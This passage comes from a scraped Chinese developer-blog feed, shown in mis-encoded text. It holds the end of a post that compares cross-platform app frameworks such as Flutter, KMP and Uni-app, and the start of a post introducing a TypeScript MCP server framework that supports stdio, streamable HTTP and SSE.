<strong>æŠ€æœ¯æ ˆç»‘å®š</strong>
ä¸»è¦é€‚åˆVueæŠ€æœ¯æ ˆ</p>
</li>
</ul>
<h3 data-id="heading-16">5.3 Valdi</h3>
<p>Valdiçš„æ ¸å¿ƒæ€è·¯å±äºè½¬è¯‘æ–¹æ¡ˆçš„èŒƒç•´ï¼Œä½†æ˜¯å¹¶å‘ä»£ç çº§è½¬è¯‘ã€‚</p>
<p>å®ƒé‡‡ç”¨äº†ä»‹äºè½¬è¯‘å’Œä¸­é—´å±‚ä¹‹é—´çš„æ··åˆæ¶æ„ï¼Œå°†UIç»„ä»¶æ ‘ç¼–è¯‘ä¸ºåŸç”Ÿç»„ä»¶å¹¶äº¤ç”±C++å¼•æ“ç®¡ç†ç”Ÿå‘½å‘¨æœŸï¼ŒåŒæ—¶ä¿ç•™ä¸šåŠ¡é€»è¾‘åœ¨TSå±‚ï¼ˆWorkerï¼‰è¿è¡Œï¼Œä»è€Œå®ç°æ— JS Bridgeçš„é«˜æ€§èƒ½æ¸²æŸ“ã€‚</p>
<p>è¿™æ ·çš„å¥½å¤„æ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…äº†è½¬è¯‘ç±»æ–¹æ¡ˆä»£ç ç¿»è¯‘ä¸åˆ°ä½é€ æˆçš„ä¸€äº›é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ä»ç„¶ä¼šæœ‰ä¸­é—´å±‚æ–¹æ¡ˆåœ¨é«˜UIäº¤äº’åœºæ™¯ä¸‹çš„æ€§èƒ½é—®é¢˜ï¼Œè¿™éƒ¨åˆ†å°±éœ€è¦æŠŠå¤„ç†é€»è¾‘æ”¾åˆ°C++/Swift/Kotlinç¼–å†™çš„Polyglotæ¨¡å—è§£å†³ã€‚</p>
<p>ç«™åœ¨çº¯ç²¹å®¢æˆ·ç«¯è·¨å¹³å°å¼€å‘çš„è§’åº¦ï¼Œè½¬è¯‘ç±»æ–¹æ¡ˆè€åˆ˜ç›®å‰æ›´æ¨èKMPã€‚</p>
<p>Valdiå¯ä»¥ä½œä¸ºä¸€ä¸ªæœ‰æ½œåŠ›çš„å¤‡é€‰ï¼Œç­‰ç”Ÿæ€æ›´åŠ æˆç†Ÿåå†é‡æ–°è€ƒè™‘ã€‚</p>
<hr/>
<h2 data-id="heading-17">6. æŠ€æœ¯é€‰å‹æŒ‡å—</h2>
<p>çœ‹äº†è¿™ä¹ˆå¤šæŠ€æœ¯æ ˆï¼Œæ˜¯ä¸æ˜¯æ›´æ™•äº†ï¼Ÿè€åˆ˜æŠŠå¤æ‚çš„é€‰å‹é€»è¾‘æµ“ç¼©æˆä¸€ä»½<strong>å®æˆ˜å†³ç­–æŒ‡å—</strong>ï¼Œå¸®ä½ å¿«é€Ÿæ‹æ¿ã€‚</p>
<h3 data-id="heading-18">6.1 æ ¸å¿ƒæ¨èï¼šFlutter (é€šç”¨é¦–é€‰)</h3>
<p>å¯¹äº 90% çš„æ–°å¯åŠ¨ App é¡¹ç›®ï¼Œ<strong>Flutter æ˜¯å½“å‰ç‰ˆæœ¬çš„æœ€ä¼˜è§£</strong>ã€‚</p>
<ul>
<li><strong>æ€§èƒ½å¼ºæ‚</strong>
è‡ªå¸¦ Impeller æ¸²æŸ“å¼•æ“ï¼Œä¸ä¾èµ–ç³»ç»Ÿç»„ä»¶ï¼Œä½“éªŒæ— é™æ¥è¿‘åŸç”Ÿã€‚æ— è®ºæ˜¯å¤æ‚çš„åŠ¨ç”»è¿˜æ˜¯é«˜æ€§èƒ½åˆ—è¡¨ï¼Œéƒ½èƒ½è½»æ¾é©¾é©­ã€‚</li>
<li><strong>æ•ˆç‡æé«˜</strong>
Hot Reload (çƒ­é‡è½½) è®©æ”¹ä»£ç åƒåˆ·æ–°ç½‘é¡µä¸€æ ·å¿«ã€‚ä¸€å¥—ä»£ç è¦†ç›– Androidã€iOSã€Web ç”šè‡³æ¡Œé¢ç«¯ï¼Œç ”å‘æˆæœ¬é™ä½ 40% ä»¥ä¸Šã€‚</li>
<li><strong>AI å‹å¥½</strong>
ä½œä¸º Google äº²å„¿å­ï¼ŒCursorã€Claude ç­‰ AI å·¥å…·å¯¹ Dart/Flutter çš„æ”¯æŒæä¸ºæˆç†Ÿï¼Œèƒ½è‡ªåŠ¨ç”Ÿæˆé«˜è´¨é‡ UI ä»£ç ã€‚</li>
</ul>
<p><strong>âš ï¸ é¿å‘æç¤º</strong>
å¦‚æœä½ çš„åº”ç”¨æåº¦ä¾èµ–åŸç”Ÿæ¯”å¦‚æœ‰å¤§é‡å†å²é—ç•™çš„åŸç”Ÿä»£ç ï¼Œæˆ–å¯¹åŒ…ä½“ç§¯æœ‰è‹›åˆ»è¦æ±‚ (&lt;10MB)ï¼Œéœ€è°¨æ…è¯„ä¼°ã€‚</p>
<h3 data-id="heading-19">6.2 æ½œåŠ›è§‚å¯Ÿï¼šKotlin Multiplatform (KMP)</h3>
<p>æåº¦ä¾èµ–åŸç”Ÿçš„æœ€ä½³é€‰æ‹©ã€‚</p>
<ul>
<li>
<p><strong>æ ¸å¿ƒå®šä½</strong>
<strong>é€»è¾‘å…±äº«ï¼ŒUI åŸç”Ÿ</strong>ã€‚
å®ƒä¸å¼ºæ±‚ UI ç»Ÿä¸€ï¼Œè€Œæ˜¯è®© Android å’Œ iOS å…±äº«æ•°æ®å±‚ã€ç½‘ç»œå±‚å’Œä¸šåŠ¡é€»è¾‘ä»£ç ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨åœºæ™¯</strong></p>
<ul>
<li>å·²ç»åœ¨åŸç”Ÿå±‚é¢ç§¯ç´¯äº†å¤§é‡çš„UIç»„ä»¶å’ŒåŠŸèƒ½æ¨¡å—ï¼Œå¯ä»¥é€æ­¥æŠŠä¸šåŠ¡é€»è¾‘åˆ‡æ¢åˆ°KMPã€‚</li>
<li>åº”ç”¨å¼ºä¾èµ–ç³»ç»Ÿåº•å±‚èƒ½åŠ› (è“ç‰™ã€NFCã€æ·±åº¦ç¡¬ä»¶äº¤äº’)ï¼ŒåŒæ—¶åˆå¸Œæœ›ä¿æŒè·¨å¹³å°çš„ä¼˜åŠ¿ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç°çŠ¶åˆ¤æ–­</strong>
æŠ€æœ¯ç†å¿µå…ˆè¿›ï¼Œä½†ç¬¬ä¸‰æ–¹ç”Ÿæ€ä»åœ¨çˆ¬å¡æœŸã€‚<strong>2026 è°¨æ…å…¨é‡ All-inã€‚</strong></p>
</li>
</ul>
<h3 data-id="heading-20">6.3 è°¨æ…è¯„ä¼°éœ€æ±‚ï¼šApp + å°ç¨‹åº â‰  ä¸€å¥—ä»£ç </h3>
<p>ä¸€ä¸ªäº§å“æœ‰Appå’Œå°ç¨‹åºä¸ä»£è¡¨ä»–ä»¬çš„ä¸šåŠ¡é€»è¾‘æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œå°ç¨‹åºåœ¨äº§å“å®šä½ä¸Šä¸åº”è¯¥æ˜¯Appçš„ç®€åŒ–ç‰ˆã€‚</p>
<ul>
<li><strong>æœ€ä½³å®è·µï¼šAppå’Œå°ç¨‹åºæ‰¿æ‹…ä¸åŒçš„äº§å“èŒè´£</strong>
<ul>
<li><strong>App (Flutter/åŸç”Ÿ)</strong>
è´Ÿè´£æ²‰æµ¸å¼ä½“éªŒã€å¤æ‚äº¤äº’ã€é«˜ç²˜æ€§ç•™å­˜ (å¦‚é˜…è¯»ã€åˆ›ä½œã€ç¤¾äº¤)ã€‚</li>
<li><strong>å°ç¨‹åº (åŸç”Ÿ/Uni-app)</strong>
è´Ÿè´£è¥é”€è£‚å˜ã€å³ç”¨å³èµ°ã€ä½æˆæœ¬è·å®¢ (å¦‚åˆ†äº«è½åœ°é¡µã€ç®€å•å·¥å…·)ã€‚</li>
</ul>
</li>
<li><strong>å†³ç­–ä¾æ®</strong>
åªæœ‰å½“åŠŸèƒ½é‡å åº¦ &gt; 80% ä¸”äº¤äº’æå…¶ç®€å• (å¦‚çº¯å±•ç¤ºç±»æ–°é—»ã€ç®€å•ç”µå•†) æ—¶ï¼Œæ‰æ¨èä½¿ç”¨ Uni-app/Taro ç­‰æ–¹æ¡ˆåŒæ—¶ç”Ÿæˆ App å’Œå°ç¨‹åºã€‚</li>
</ul>
<h3 data-id="heading-21">6.4 å†³ç­–é€ŸæŸ¥è¡¨</h3>








































<table><thead><tr><th align="left">ä½ çš„é¡¹ç›®åœºæ™¯</th><th align="left">æ¨èæŠ€æœ¯æ ˆ</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left"><strong>ä» 0 åˆ° 1 æ–°é¡¹ç›®</strong></td><td align="left"><strong>Flutter</strong></td><td align="left">æ•ˆç‡ä¸ä½“éªŒçš„æœ€ä½³å¹³è¡¡ç‚¹</td></tr><tr><td align="left"><strong>åŸç”Ÿé¡¹ç›®è½¬å‹è·¨å¹³å°</strong></td><td align="left"><strong>Flutter</strong></td><td align="left">å¯ä»¥å¢é‡è¿ç§»ï¼Œæ··åˆå¼€å‘é£é™©ä½</td></tr><tr><td align="left"><strong>é‡åº¦ä¾èµ–åŸç”Ÿåº•å±‚</strong></td><td align="left"><strong>KMP</strong></td><td align="left">é£é™©ä½ï¼Œæ¸è¿›å¼é‡æ„</td></tr><tr><td align="left"><strong>Appä¸å°ç¨‹åºåŠŸèƒ½é‡å </strong></td><td align="left"><strong>Uni-app</strong></td><td align="left">å°ç¨‹åºæ”¯æŒå¥½</td></tr><tr><td align="left"><strong>ç³»ç»Ÿçº§å·¥å…·</strong></td><td align="left"><strong>çº¯åŸç”Ÿ (Swift/Kotlin)</strong></td><td align="left">æ— ä¸­é—´å±‚æŸè€—ï¼Œå®Œå…¨æŒæ§ç¡¬ä»¶</td></tr><tr><td align="left"><strong>å›¢é˜Ÿ Web èƒŒæ™¯</strong></td><td align="left"><strong>React Native</strong></td><td align="left">å­¦ä¹ æ›²çº¿å¹³æ»‘ï¼Œç¤¾åŒºèµ„æºä¸°å¯Œ</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-22">7. æ€»ç»“ä¸å»ºè®®</h2>
<p>å†™äº†è¿™ä¹ˆå¤šï¼Œè€åˆ˜æœ€åç»™ä½ ä¸€ä¸ªç»ˆæå»ºè®®ã€‚</p>
<p><strong>2026å¹´è·¨å¹³å°å¼€å‘ï¼Œè®°ä½è¿™ä¸‰ä¸ªå…³é”®è¯ï¼šåŠ¡å®ã€èšç„¦ã€é•¿æœŸä¸»ä¹‰ã€‚</strong></p>
<h3 data-id="heading-23">7.1 åŠ¡å®</h3>
<p>è½¯ä»¶å¼€å‘æ²¡æœ‰é“¶å¼¹ã€‚</p>
<p>Flutteræ€§èƒ½å¥½ä½†åŒ…ä½“ç§¯å¤§ï¼ŒReact NativeåŠ¨æ€æ€§å¥½ä½†æœ‰æ¡¥æ¥æŸè€—ï¼ŒKMPæ¥è¿‘åŸç”Ÿä½†ç”Ÿæ€ä¸æˆç†Ÿã€‚</p>
<p><strong>é€‰æ‹©æŠ€æœ¯çš„æ ¸å¿ƒæ˜¯ï¼šåœ¨å½“å‰çº¦æŸæ¡ä»¶ä¸‹ï¼Œå“ªä¸ªæ–¹æ¡ˆçš„æ”¶ç›Šæœ€å¤§ã€‚</strong></p>
<h3 data-id="heading-24">7.2 èšç„¦</h3>
<p>æ²¡æœ‰é¡¹ç›®éœ€è¦è¶…è¿‡2ç§è·¨å¹³å°æ¡†æ¶åŒæ—¶ä½¿ç”¨ã€‚</p>
<p>åŒæ ·ä¹Ÿä¸æ¨èå›¢é˜ŸåŒæ—¶åœ¨å¤šä¸ªä¸åŒçš„è·¨å¹³å°æ¡†æ¶ä¸ŠæŠ•å…¥æ—¶é—´å’Œç²¾åŠ›ã€‚</p>
<p><strong>å»ºè®®ï¼šé€‰å®šä¸€ä¸ªä¸»åŠ›æŠ€æœ¯æ ˆï¼Œæœ€å¤šå†å¤‡ä¸€ä¸ªå¤‡é€‰æ–¹æ¡ˆã€‚</strong></p>
<h3 data-id="heading-25">7.3 é•¿æœŸä¸»ä¹‰</h3>
<p>çœŸæ­£å†³å®šé¡¹ç›®ç”Ÿæ­»çš„ï¼Œæ˜¯ä½ é€‰å®šæŠ€æœ¯æ ˆä¹‹ååšçš„é‚£äº›äº‹ã€‚</p>
<ul>
<li><strong>æ¶æ„è®¾è®¡å¤Ÿä¸å¤Ÿæ¸…æ™°ï¼Ÿ</strong></li>
<li><strong>å¼€å‘æµç¨‹å¤Ÿä¸å¤Ÿè§„èŒƒï¼Ÿ</strong></li>
<li><strong>ä»£ç è§„èŒƒå¤Ÿä¸å¤Ÿä¸¥æ ¼ï¼Ÿ</strong></li>
<li><strong>æŠ€æœ¯å€ºåŠ¡ç®¡ç†å¤Ÿä¸å¤ŸåŠæ—¶ï¼Ÿ</strong></li>
</ul>
<p>é€‰å®šæŠ€æœ¯æ ˆä¸æ˜¯ç»ˆç‚¹ï¼Œè€Œæ˜¯èµ·ç‚¹ã€‚</p>
<p>åšå¥½è¿™äº›åŸºç¡€å»ºè®¾ï¼Œæ‰æ˜¯é¡¹ç›®èƒ½æŒç»­å¥åº·æ¼”è¿›çš„æ ¹æœ¬ã€‚</p>
<p>å¦åˆ™ï¼Œå†å¥½çš„æŠ€æœ¯æ ˆä¹Ÿæ•‘ä¸äº†ä½ ã€‚</p>
<p>æœ€åï¼Œå¸Œæœ›è¿™ç¯‡è·¨å¹³å°å¼€å‘åœ°å›¾èƒ½å¸®ä½ é¿å¼€é‚£äº›å‘ï¼Œæ‰¾åˆ°æœ€é€‚åˆä½ çš„è·¯ã€‚</p>
<blockquote>
<p>å¦‚æœçœ‹åˆ°è¿™é‡Œçš„åŒå­¦å¯¹å®¢æˆ·ç«¯æˆ–è€…Flutterå¼€å‘æ„Ÿå…´è¶£ï¼Œæ¬¢è¿è”ç³»è€åˆ˜ï¼Œæˆ‘ä»¬äº’ç›¸å­¦ä¹ ã€‚</p>
<p>ç§ä¿¡å…è´¹é¢†è€åˆ˜æ•´ç†çš„ã€ŠFlutterå¼€å‘æ‰‹å†Œã€‹ï¼Œè¦†ç›–90%åº”ç”¨å¼€å‘åœºæ™¯ã€‚</p>
<p>å¯ä»¥ä½œä¸ºFlutterå­¦ä¹ çš„çŸ¥è¯†åœ°å›¾ã€‚</p>
<p>â€”â€” laoliu_dev</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶]]></title>    <link>https://juejin.cn/post/7597623392456097843</link>    <guid>https://juejin.cn/post/7597623392456097843</guid>    <pubDate>2026-01-21T09:38:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623392456097843" data-draft-id="7597622924272173083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-21T09:38:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€MCPã€‘åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCPæœåŠ¡æ¡†æ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:38:31.000Z" title="Wed Jan 21 2026 09:38:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šè”¡æ¬£å½¤</p>
<h2 data-id="heading-0">é¡¹ç›®è¯´æ˜</h2>
<p>è¿™æ˜¯ä¸€ä¸ªåŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§åè®®çš„MCP-Serverçš„æ¡†æ¶ï¼ˆtsè¯­è¨€ï¼‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆæˆ‘æƒ³åšè¿™ä¸ªæ¡†æ¶å‘¢ï¼Ÿå› ä¸ºéšç€AIå‘å±•ï¼Œç°åœ¨è¶Šæ¥è¶Šå¤šä¸šåŠ¡éœ€è¦å’ŒAIç›¸ç»“åˆã€‚è€Œæˆ‘åœ¨åšAIåº”ç”¨ä¸­å‘ç°ï¼ŒMCPæœåŠ¡åœ¨AIæ–¹å‘çš„ä¸šåŠ¡ä½¿ç”¨é¢‘ç‡å¾ˆé«˜ï¼Œä½†éšç€ä¸šåŠ¡çš„åŠ æ·±ï¼Œå‘ç°å­˜åœ¨ä»¥ä¸‹ç—›ç‚¹ï¼š</p>
<p>1.é’ˆå¯¹ä¸åŒä¸šåŠ¡ï¼Œå¯¹äºmcp-serveréœ€è¦çš„ç±»å‹ä¸åŒï¼Œæœ‰çš„å°±éœ€è¦stdioï¼Œæœ‰çš„éœ€è¦ç½‘ç»œè¯·æ±‚</p>
<p>2.ä¸åŒå¹³å°å¯¹MCPæœåŠ¡åè®®è¦æ±‚ä¸åŒï¼Œæœ‰æ”¯æŒstreamableHttpï¼Œæœ‰ä»…æ”¯æŒsseçš„ã€‚</p>
<p>è¿™ä¸¤ç§æƒ…å†µï¼Œä¼šå‡ºç°ç›¸åŒåŠŸèƒ½é‡å¤å¼€å‘ï¼Œé‡å¤é€ è½®å­ï¼Œæµªè´¹æ—¶é—´æˆæœ¬</p>
<ol start="3">
<li>æ­¤å¤–ï¼Œæœ‰äº›ç ”å‘äººå‘˜ç›®å‰å¹¶ä¸äº†è§£MCPï¼Œåœ¨ä¸šåŠ¡å¼€å‘æ—¶å€™éœ€è¦ç°å­¦</li>
</ol>
<p>è€Œè¿™ä¼šè®©ç ”å‘å‘¨æœŸåŠ é•¿ï¼Œæ—¶é—´æˆæœ¬è€—è´¹è¿‡å¤š</p>
<p>æ‰€ä»¥ä¸ºäº†è§£å†³ä»¥ä¸Šç—›ç‚¹ï¼Œæˆ‘ä»0-1æ­å»ºäº†è¿™ä¸ªæ¡†æ¶ã€‚<strong>è¿™ä¸ªæ¡†æ¶ç‰¹ç‚¹</strong>ï¼š</p>
<p>1.åŒæ—¶æ”¯æŒstdioï¼ŒstreamableHttplesså’Œsseä¸‰ç§æ¨¡å¼ï¼Œå®ç°ä¸€æ¬¡å¼€å‘æ”¯æŒä¸‰ç§æ¨¡å¼</p>
<p>2.æ‰€æœ‰åŠŸèƒ½éƒ½æ‹†åˆ†ä¸ºç‹¬ç«‹æ¨¡å—ã€‚è¿™æ ·å³ä½¿ä¸æ‡‚çš„äººï¼Œåªè¦åœ¨æŒ‡å®šçš„æ–‡ä»¶é‡Œé¢ç¼–å†™ä¸šåŠ¡é€»è¾‘ï¼Œå°±å¯ä»¥åˆ›é€ è‡ªå·±çš„mcpæœåŠ¡</p>
<p>3.æ”¯æŒç¯å¢ƒå˜é‡ï¼Œå¯é€šè¿‡ç¯å¢ƒå˜é‡é…ç½®åŸŸåï¼ŒæœåŠ¡åœ°å€ï¼Œç«¯å£å’Œhostï¼ŒçœŸæ­£é€‚ç”¨äºç”Ÿäº§ä½¿ç”¨</p>
<p>4.åˆ‡æ¢æ¨¡å¼ä¹Ÿå¾ˆç®€å•ï¼Œåªè¦åœ¨å¯åŠ¨è„šæœ¬æ ¹æ®éœ€è¦ï¼Œåˆ‡æ¢å¯åŠ¨å‘½ä»¤å³å¯ï¼Œæ”¹åŠ¨æˆæœ¬è¿‘ä¹æ— </p>
<p>5.æ·»åŠ æ—¥å¿—æ¨¡å—ï¼Œæ–¹ä¾¿æŸ¥é˜…å¯åŠ¨å’ŒæœåŠ¡è°ƒç”¨æƒ…å†µ</p>
<p>6.åŒæ—¶æ·»åŠ è¡Œäº‘è„šæœ¬ï¼Œæ”¯æŒè¡Œäº‘éƒ¨ç½²</p>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FXingtongCai%2Fmcp-server-ts" target="_blank" title="https://github.com/XingtongCai/mcp-server-ts" ref="nofollow noopener noreferrer">github.com/XingtongCaiâ€¦</a>ï»¿</p>
<p>codingåœ°å€ï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2Fxingyun.jd.com%2FcodingRoot%2Fjdcloud-fe%2Fmcp-server%2Ftree%2Fmain%2Fdemo" target="_blank" title="http://xingyun.jd.com/codingRoot/jdcloud-fe/mcp-server/tree/main/demo" ref="nofollow noopener noreferrer">xingyun.jd.com/codingRoot/â€¦</a></p>
<h2 data-id="heading-1">å†…å®¹ä»‹ç»</h2>
<p>æ•´ä¸ªæ¡†æ¶çš„ç»“æ„å¾ˆç®€å•ï¼Œå°±å¦‚ä¸‹è¿™äº›ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">## ç›®å½•ç»“æ„</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build:</span> <span class="hljs-string">ç¼–è¯‘ä¹‹åçš„æ–‡ä»¶</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">src</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">router:</span> <span class="hljs-string">é…ç½®streamableHttpå’Œsseåè®®çš„è·¯ç”±</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ³¨å†ŒstreamableHttpè·¯ç”±å…¥å£</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">mcp.ts:</span> <span class="hljs-string">streamableHttpçš„é…ç½®è·¯å¾„ï¼Œå…·ä½“ä¸º`process.env.MCP_BASE_PATH`çš„è·¯å¾„è¯·æ±‚,å¦‚æœæ²¡æœ‰é…ç½®ï¼Œé»˜è®¤/mcpã€‚å¦‚æœæœ‰éœ€è¦æ·»åŠ äºŒçº§è·¯å¾„ï¼Œä¾‹å¦‚</span> <span class="hljs-string">/mcp/eventï¼Œéœ€è¦åœ¨è¿™é‡Œé¢æ·»åŠ ä¸€ä¸‹/event,å¦‚æœä¸€çº§ä¸ç”¨åŠ¨</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">sseçš„é…ç½®è·¯å¾„ï¼Œå…·ä½“ä¸º`process.env.MCP_BASE_PATH`çš„è·¯å¾„è¯·æ±‚,å¦‚æœæ²¡æœ‰é…ç½®ï¼Œé»˜è®¤/mcpã€‚å¦‚æœæœ‰éœ€è¦æ·»åŠ äºŒçº§è·¯å¾„ï¼Œä¾‹å¦‚</span> <span class="hljs-string">/mcp/eventï¼Œéœ€è¦åœ¨è¿™é‡Œé¢æ·»åŠ ä¸€ä¸‹/event,å¦‚æœä¸€çº§ä¸ç”¨åŠ¨</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">tools:</span> <span class="hljs-string">mcpçš„å·¥å…·</span> 
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">æ³¨å†Œå·¥å…·</span>
